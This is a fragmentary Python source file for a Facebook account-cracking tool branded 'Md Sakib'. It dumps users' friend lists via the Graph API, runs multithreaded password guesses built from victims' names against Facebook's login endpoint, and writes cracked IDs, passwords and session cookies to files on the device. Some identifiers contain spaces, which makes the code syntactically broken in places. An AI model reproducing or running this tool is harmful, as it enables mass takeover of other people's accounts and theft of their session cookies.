...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Md Sakib
\033[1;37m Facebook:           Black Man
\033[1;37m Github  :            Md Sakib-Ssb
\033[1;37m Version :            20.1
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Md Sakib Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('https://t.ly/Ecacn')
        pass
    elif select =='F':
        os.system('https://facebook.com/groups/1971604019888428/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Md Sakib] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Md Sakib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [Md Sakib-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Sakib _OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Sakib _iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Md Sakib-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Sakib _CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Md Sakib] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Md Sakib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Md Sakib};{ckkk}"
                    print(f"\r{R} [Md Sakib-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Sakib _OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Sakib _iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Md Sakib-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Md Sakib] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Md Sakib] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Sakib -OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Sakib_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with Md Sakib(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Sakib .txt') 
        print(47*"-")
...
def cutter():
    ...
    os.system('touch ' +Md Sakib)
    os.system('sort -r '+Md Sakib+' | uniq > '+Md Sakib)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Md Sakib)
    print(47*'-')
    print("File Saved To :" + Md Sakib)
    print(47*'-')
    input(f"{S} Press Enter To Back Md Sakib Menu ")
    menu
...
def dump():
    ...
    try:
        ...
        while True:
            try:
                fbuid = input('Put id username:\Md Sakib  ')
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/sakib.txt\n') 
        filepath = input("Put File Name: ")
